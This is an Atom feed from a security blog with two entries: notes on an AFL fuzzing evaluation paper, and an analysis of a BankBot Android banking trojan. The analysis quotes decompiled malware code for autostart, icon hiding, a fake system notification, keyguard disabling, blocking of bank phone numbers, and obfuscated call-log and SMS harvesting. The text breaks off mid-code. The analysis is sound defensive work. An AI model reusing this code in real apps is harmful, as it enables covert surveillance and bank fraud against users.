<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>安全代码</title>
  
  
  <link href="http://usmacd.com/atom.xml" rel="self"/>
  
  <link href="http://usmacd.com/"/>
  <updated>2022-03-04T02:07:24.796Z</updated>
  <id>http://usmacd.com/</id>
  
  <author>
    <name>henices</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</title>
    <link href="http://usmacd.com/2022/03/04/afl-fuzz1/"/>
    <id>http://usmacd.com/2022/03/04/afl-fuzz1/</id>
    <published>2022-03-04T02:07:24.796Z</published>
    <updated>2022-03-04T02:07:24.796Z</updated>
    
    <content type="html"><![CDATA[<p>paper: <a href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p><h2 id="两个实验的结论-主要基于-FuzzBench"><a href="#两个实验的结论-主要基于-FuzzBench" class="headerlink" title="两个实验的结论 (主要基于 FuzzBench)"></a>两个实验的结论 (主要基于 FuzzBench)</h2><ul><li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance ofeach variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggeststhat users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li><li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline.</li></ul><h2 id="论文中计划要评估的-afl-fuzz-的一些技术"><a href="#论文中计划要评估的-afl-fuzz-的一些技术" class="headerlink" title="论文中计划要评估的 afl-fuzz 的一些技术"></a>论文中计划要评估的 afl-fuzz 的一些技术</h2><ul><li>Hitcounts:Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li><li>Novelty search vs. maximization of a fitness:While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul><li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li><li>We expect the novelty search to outperforms both of the competing algorithms,</li></ul></li><li>Corpus culling:The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul><li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li><li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li></ul></li><li>Score calculation:The performance score used to cal-culate how many times to mutate and execute the input inthe havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul><li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li></ul></li><li>Corpus scheduling:The FIFO policy used by AFL isonly one of the possible policies that a fuzzer can adopt toselect the next testcase<ul><li>Thus, we evaluate AFLversus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li></ul></li><li>Splicing as stage vs. splicing as mutation:Splicing refers to the operation that merges two different testcases into a new one<ul><li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li></ul></li><li>Trimming:Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul><li>Despite the fact that this algorithm can bring the twoimportant benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li><li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li></ul></li><li>Collisions:As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul><li>We want to benchmark this feature as the collision-freevariant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;paper: &lt;a href=&quot;https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf&quot;&gt;https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pd</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Bankbot APK 样本分析</title>
    <link href="http://usmacd.com/2022/02/22/BankBot/"/>
    <id>http://usmacd.com/2022/02/22/BankBot/</id>
    <published>2022-02-22T05:35:06.099Z</published>
    <updated>2022-02-22T05:35:06.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-样本概况"><a href="#0x00-样本概况" class="headerlink" title="0x00 样本概况"></a>0x00 样本概况</h2><table><thead><tr><th>字段</th><th>内容</th></tr></thead><tbody><tr><td>样本名</td><td>BankBot</td></tr><tr><td>MD5</td><td>3c42c391bec405bb28b28195c2961778</td></tr><tr><td>SHA256</td><td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td></tr><tr><td>文件类型</td><td>APK</td></tr></tbody></table><p>这是一个以盗窃信用卡用户密码为主要目的的bot。安装后显示为Android图标。打开App后<br>会以Android系统更新的形式，诱导用户操作达到常驻系统的目的。</p><h2 id="0x01-行为分析"><a href="#0x01-行为分析" class="headerlink" title="0x01 行为分析"></a>0x01 行为分析</h2><h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.market.Autorun&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;999&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Autorun</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.android.market;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Autorun</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Autorun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Intent v0 = <span class="keyword">new</span> Intent(context, Scheduler.class);</span><br><span class="line">        v0.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">        context.startService(v0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开机将启动 Schedule 服务</p><h3 id="Schedule-服务"><a href="#Schedule-服务" class="headerlink" title="Schedule 服务"></a>Schedule 服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    Utils.registerIfNeeded(((Context)<span class="keyword">this</span>));</span><br><span class="line">    Object v0 = <span class="keyword">this</span>.getSystemService(<span class="string">&quot;alarm&quot;</span>);</span><br><span class="line">    PendingIntent v6 = PendingIntent.getBroadcast(((Context)<span class="keyword">this</span>), <span class="number">0</span>, <span class="keyword">new</span> Intent(((Context)<span class="keyword">this</span>), </span><br><span class="line">            NetworkController.class), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> v7 = FileController.fileExists(((Context)<span class="keyword">this</span>), <span class="string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController</span><br><span class="line">            .readFile(((Context)<span class="keyword">this</span>), <span class="string">&quot;interval&quot;</span>)) : <span class="number">0xA</span>;</span><br><span class="line">    ((AlarmManager)v0).setRepeating(<span class="number">0</span>, System.currentTimeMillis() + <span class="number">0x2710</span>, ((<span class="keyword">long</span>)(v7 * <span class="number">0x3E8</span>)), </span><br><span class="line">            v6);</span><br><span class="line">    <span class="keyword">this</span>.handleCrashes();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Schedule 服务使用alarm manager 注册一个定时任务。这个定时任务由NetworkController完成。<br>时间间隔由配置文件interval决定。</p><p>com.android.market.FileController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">fileExists</span><span class="params">(Context context, String filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> File(context.getFilesDir(), filename).exists();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="隐藏App-图标"><a href="#隐藏App-图标" class="headerlink" title="隐藏App 图标"></a>隐藏App 图标</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">hideApp</span><span class="params">(Context context, <span class="keyword">boolean</span> hide)</span> </span>&#123;</span><br><span class="line">    ComponentName v0 = <span class="keyword">new</span> ComponentName(context.getPackageName(), String.valueOf(context.getPackageName())</span><br><span class="line">             + <span class="string">&quot;.MainActivity&quot;</span>);</span><br><span class="line">    PackageManager v3 = context.getPackageManager();</span><br><span class="line">    <span class="keyword">int</span> v1 = hide ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    v3.setComponentEnabledSetting(v0, v1, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="伪造的系统Notification"><a href="#伪造的系统Notification" class="headerlink" title="伪造的系统Notification"></a>伪造的系统Notification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">new</span> AppCrash().Register(((Context)<span class="keyword">this</span>));</span><br><span class="line">    Notification v3 = <span class="keyword">new</span> Notification(<span class="number">0x108008A</span>, <span class="string">&quot;Android system requires user action&quot;</span>, System.</span><br><span class="line">            currentTimeMillis());</span><br><span class="line">    Intent v1 = <span class="keyword">new</span> Intent(<span class="keyword">this</span>.getApplicationContext(), AdminX.class);</span><br><span class="line">    v1.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">    v1.setFlags(<span class="number">0x34000000</span>);</span><br><span class="line">    v3.setLatestEventInfo(<span class="keyword">this</span>.getBaseContext(), <span class="string">&quot;Android&quot;</span>, <span class="string">&quot;Android system requires action&quot;</span>, PendingIntent</span><br><span class="line">            .getActivity(((Context)<span class="keyword">this</span>), <span class="number">0</span>, v1, <span class="number">0x8000000</span>));</span><br><span class="line">    v3.flags |= <span class="number">0x62</span>;</span><br><span class="line">    <span class="keyword">this</span>.startForeground(<span class="number">2</span>, v3);</span><br><span class="line">    <span class="keyword">new</span> Helper(<span class="keyword">this</span>).execute(<span class="keyword">new</span> Void[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="禁用屏幕锁定"><a href="#禁用屏幕锁定" class="headerlink" title="禁用屏幕锁定"></a>禁用屏幕锁定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminX.<span class="keyword">this</span>.getSystemService(<span class="string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="string">&quot;ANDROID&quot;</span>).disableKeyguard();</span><br></pre></td></tr></table></figure><h3 id="禁止拨打指定号码电话"><a href="#禁止拨打指定号码电话" class="headerlink" title="禁止拨打指定号码电话"></a>禁止拨打指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">    String[] v8;</span><br><span class="line">    String action = intent.getAction();</span><br><span class="line">    String v6 = intent.getStringExtra(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    String v3 = intent.getStringExtra(<span class="string">&quot;incoming_number&quot;</span>);</span><br><span class="line">    String v5 = intent.getStringExtra(<span class="string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);</span><br><span class="line">    String v1 = <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    String v10 = <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    String v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;</span><br><span class="line">        String v4 = v5.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(</span><br><span class="line">                <span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(v1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            v8 = v1.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(v8.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> v13;</span><br><span class="line">                <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v4.contains(v8[v13])) &#123;</span><br><span class="line">                        v9 = <span class="number">1</span>;</span><br><span class="line">                        v11 = String.valueOf(v11) + <span class="string">&quot;blocked outgoing call&quot;</span>;</span><br><span class="line">                        <span class="keyword">this</span>.setResultData(<span class="keyword">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">            v11 = String.valueOf(v11) + <span class="string">&quot;outgoing call&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> ReportWithDataTask(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;[&quot;</span> + <span class="keyword">this</span>.toJSON(v4, </span><br><span class="line">                v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>通过网页 <a href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> 中的信息我们可以知道：</p><p>8005555550 4955005550 这两个号码 sberbank 的号码，在俄罗斯拨打免费。</p><h3 id="禁止接听指定号码电话"><a href="#禁止接听指定号码电话" class="headerlink" title="禁止接听指定号码电话"></a>禁止接听指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">String v10 = <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((action.equals(<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="string">&quot;RINGING&quot;</span>))) &#123;</span><br><span class="line">String v2 = v3 != <span class="keyword">null</span> ? v3.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(</span><br><span class="line">        <span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) : <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(v10 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    v8 = v10.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v2.contains(v8[v13])) &#123;</span><br><span class="line">            v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">            v9 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">this</span>.hangUp(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!v2.contains(<span class="string">&quot;Unknown&quot;</span>)) &#123;</span><br><span class="line">        goto label_106;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.hangUp(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">label_106:</span><br><span class="line"><span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">    v11 = <span class="string">&quot;incoming call&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ReportWithDataTask(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;[&quot;</span> + <span class="keyword">this</span>.toJSON(v2, </span><br><span class="line">        v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="隐私窃取"><a href="#隐私窃取" class="headerlink" title="隐私窃取"></a>隐私窃取</h3><h4 id="获取电话拨打记录"><a href="#获取电话拨打记录" class="headerlink" title="获取电话拨打记录"></a>获取电话拨打记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">getCallLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder v20 = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    String v18 = <span class="string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    Cursor v10 = <span class="keyword">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="keyword">null</span>, <span class="keyword">null</span>, </span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    String v15 = <span class="string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    String v16 = <span class="string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    String v22 = <span class="string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span></span><br><span class="line">            .replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> v17 = v10.getColumnIndex(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v21 = v10.getColumnIndex(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v11 = v10.getColumnIndex(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v14 = v10.getColumnIndex(<span class="string">&quot;duration&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(!v10.isAfterLast()) &#123;</span><br><span class="line">            String v19 = v10.getString(v17);</span><br><span class="line">            String v9 = v10.getString(v21);</span><br><span class="line">            String v7 = v10.getString(v11);</span><br><span class="line">            String v8 = v10.getString(v14);</span><br><span class="line">            String v13 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">switch</span>(Integer.parseInt(v9)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v13 = v15;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v13 = v18;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v13 = v16;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(</span><br><span class="line">                    v7), JSONObject.quote(v8), JSONObject.quote(v13)));</span><br><span class="line">            <span class="keyword">if</span>(!v10.isLast()) &#123;</span><br><span class="line">                v20.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v10.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v10.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v20.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取短信记录"><a href="#获取短信记录" class="headerlink" title="获取短信记录"></a>获取短信记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">getSmsLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder v10 = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    Cursor v8 = <span class="keyword">this</span>.context.getContentResolver().query(Uri.parse(<span class="string">&quot;content://ABC&quot;</span>.replace(<span class="string">&quot;A&quot;</span>, </span><br><span class="line">            <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot;B&quot;</span>, <span class="string">&quot;m&quot;</span>).replace(<span class="string">&quot;C&quot;</span>, <span 